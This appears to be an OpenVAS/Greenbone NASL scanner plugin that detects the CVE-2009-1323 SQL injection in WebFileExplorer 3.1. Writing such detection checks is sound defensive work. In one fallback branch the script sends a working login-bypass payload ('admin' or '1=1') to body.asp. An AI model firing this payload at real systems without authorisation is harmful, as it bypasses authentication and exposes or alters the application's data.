CPE = "cpe:/a:webfileexplorer:web_file_explorer";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100137" );
	script_version( "2021-05-18T07:19:12+0000" );
	script_tag( name: "last_modification", value: "2021-05-18 07:19:12 +0000 (Tue, 18 May 2021)" );
	script_tag( name: "creation_date", value: "2009-04-16 19:20:22 +0200 (Thu, 16 Apr 2009)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2009-1323" );
	script_bugtraq_id( 34462 );
	script_name( "WebFileExplorer 'body.asp' SQLi Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_dependencies( "webfileexplorer_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "webfileexplorer/detected" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/34462" );
	script_tag( name: "summary", value: "WebFileExplorer is prone to an SQL injection (SQLi)
  vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an
  SQL query." );
	script_tag( name: "affected", value: "WebFileExplorer 3.1 is vulnerable. Other versions may also be
  affected." );
	script_tag( name: "impact", value: "Exploiting this issue could allow an attacker to compromise the
  application, access or modify data, or exploit latent vulnerabilities in the underlying database." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one." );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("version_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!infos = get_app_version_and_location( cpe: CPE, port: port, exit_no_version: FALSE )){
	exit( 0 );
}
vers = infos["version"];
dir = infos["location"];
if( vers && vers != "unknown" ){
	if(version_is_equal( version: vers, test_version: "3.1" )){
		report = report_fixed_ver( installed_version: vers, fixed_version: "None", install_path: dir );
		security_message( port: port, data: report );
		exit( 0 );
	}
	exit( 99 );
}
else {
	if(!dir){
		exit( 0 );
	}
	if(dir == "/"){
		dir = "";
	}
	variables = NASLString( "login_name=&dologin=yes&id=admin%27+or+%271%3D1&pwd=xxx&B1=Login" );
	filename = NASLString( dir + "/body.asp" );
	host = http_host_name( port: port );
	req = NASLString( "POST ", filename, " HTTP/1.1\\r\\n", "Referer: http://", host, filename, "\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( variables ), "\\r\\n\\r\\n", variables );
	res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
	if(res && egrep( pattern: "Number of entries per page", string: res )){
		report = http_report_vuln_url( port: port, url: filename );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

